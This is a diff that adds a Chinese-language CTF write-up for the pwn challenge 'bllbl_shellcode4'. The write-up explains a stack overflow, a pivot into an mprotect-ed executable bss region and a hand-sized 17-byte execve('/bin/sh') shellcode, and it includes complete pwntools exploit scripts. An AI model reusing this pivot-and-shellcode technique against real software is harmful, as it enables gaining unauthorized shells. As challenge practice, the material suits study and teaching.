@@ -32,7 +32,159 @@ int main()
 
 # 题目
 
+## bllbl_shellcode4
+
+分析程序可知主要提供两个函数，先来看sub_401216
+
+![image-20250812192656281](/n0va6/assets/gitbook/images/image-20250812192656281.png)
+
+mprotect函数使得0x4040c0地址开始(包括之前)的bss段都可执行，且给了/bin/sh的地址
+
+再看sub_401306
+
+![](/n0va6/assets/gitbook/images/image-20250812192656281.png)
+
+显然可以进行栈溢出但长度不够，于是想到先迁移到bss可执行段，再编写shellcode控制程序执行
+
+exp
+
+```
+from pwn import*
+context(arch='amd64',os='linux',log_level='debug')
+
+#p=remote('1.95.36.136',2104)
+p=process('./pwn1')
+elf=ELF('./pwn1')
+
+bss=0x4040C0
+read=0x401335
+sub_rsp_x15=0x40136A
+bin_sh=0x40203F
+
+payload=b'a'*9+p64(bss)+p64(read)
+p.recvuntil(b'welcome to PolarCTF Summer Games')
+p.sendline(payload)
+```
+
+值得注意的是有个隐藏函数提供了一个有用的gadget
+
+![](/n0va6/assets/gitbook/images/Snipaste_2025-08-12_19-33-28.png)
+
+这样在编写shellcode时可以利用这个gadget跳转回去执行我们的代码
+
+本题的难点就在于怎么编写shellcode，使其能够跳转到合理的位置执行代码
+
+我们首先通过pop一个bss可执行段上的地址当做伪造的rbp，再返回read函数开始传参的地址
+
+![](/n0va6/assets/gitbook/images/Snipaste_2025-08-13_11-22-45.png)
+
+![](/n0va6/assets/gitbook/images/Snipaste_2025-08-13_11-25-16.png)
+
+上述代码执行后就会将我们给的bss-9当做输入的起始地址，然后接下来就是编写shellcode了
+
+bss-9加上伪造的rbp一共占17个字节(这一段用来构造shellcode)，接下来的返回地址就要覆盖成sub_rsp_x15返回去执行shellcode，但具体会返回到哪个位置，调试一下会更清楚
+
+先看下这部分的exp，shellcode稍后解释
+
+```
+shellcode='''
+nop;
+nop;
+nop;
+nop;
+mov al,0x3b;
+mov edi,0x40203F;
+mov esi,ebx;
+mov edx,esi;
+syscall;
+'''
+shellcode=asm(shellcode)
+print('shellcode>>',len(shellcode))
+shellcode+=p64(sub_rsp_x15)
+gdb.attach(p)
+p.sendline(shellcode)
+pause()
+p.interactive()
+```
+
+这里其实是需要控制shellcode刚好是17个字节这样后面才能覆盖返回地址，方便起见我编写的shellcode就刚好到了17字节(其实是需要进行各种尝试控制shellcode到17字节)，然后接下来进行调试
+
+![](/n0va6/assets/gitbook/images/Snipaste_2025-08-13_11-47-42.png)
+
+第二次read后执行到ret处，此时的rsp指向0x4040c8，存储的正是我们覆盖的返回地址0x40136a，执行后
+
+![](/n0va6/assets/gitbook/images/屏幕截图 2025-08-13 115137.png)
+
+jmp rsp执行后
+
+![](/n0va6/assets/gitbook/images/屏幕截图 2025-08-13 115532.png)
+
+ 这里实际上是跳过了前面4个nop空指令，至于为什么要用到4个空指令，其是因为执行完返回地址后rsp来到了距输入点9+8+8=0x19的位置，而此时的rip将执行sub rsp 0x15;执行完jmp rsp;后来到距输入点0x19-0x15=0x4的位置，即我们需要将前4个字节填充为空指令才能正确执行shellcode，接下来就只能将后续shellcode编写到17-4=13字节，就需要尽可能的缩短shellcode长度，凑巧的是按照如下编写
+
+```
+shellcode='''
+nop;
+nop;
+nop;
+nop;
+mov al,0x3b;
+mov edi,0x40203F;
+mov esi,ebx;
+mov edx,esi;
+syscall;
+'''
+```
+
+除去前面4个nop，后面长度刚好达到13字节，满足我们对shellcode的要求(这个地方还是需要不断尝试的)这里推荐一个汇编转机器语的网站
+
+[汇编](https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=mov+eax%2C0x3b&arch=x86-64&as_format=hex#assembly)
+
+完整exp
+
+```
+from pwn import*
+context(arch='amd64',os='linux',log_level='debug')
+
+#p=remote('1.95.36.136',2104)
+p=process('./pwn1')
+elf=ELF('./pwn1')
+
+bss=0x4040C0
+read=0x401335
+sub_rsp_x15=0x40136A
+bin_sh=0x40203F
+
+payload=b'a'*9+p64(bss)+p64(read)
+p.recvuntil(b'welcome to PolarCTF Summer Games')
+#gdb.attach(p)
+p.sendline(payload)
+#pause()
+
+shellcode='''
+nop;
+nop;
+nop;
+nop;
+mov al,0x3b;
+mov edi,0x40203F;
+mov esi,ecx;
+mov edx,ecx;
+syscall;
+'''
+shellcode=asm(shellcode)
+print('shellcode>>',len(shellcode))
+shellcode+=p64(sub_rsp_x15)
+#gdb.attach(p)
+p.sendline(shellcode)
+#pause
+p.interactive()
+```
+
+还有个需要注意的点是execve函数的第二三个参数要控制为0需要找到合适的寄存器，本地环境和远程略有不同，本地执行到shellcode时ecx为0(如上exp)，而远程则ebx为0，可能与所用虚拟机不容，不管怎样，多尝试几个寄存器就好啦
+
 ## like_it
+
+
 
 ![](/n0va6/assets/gitbook/images/image-20250804173926420.png)
 
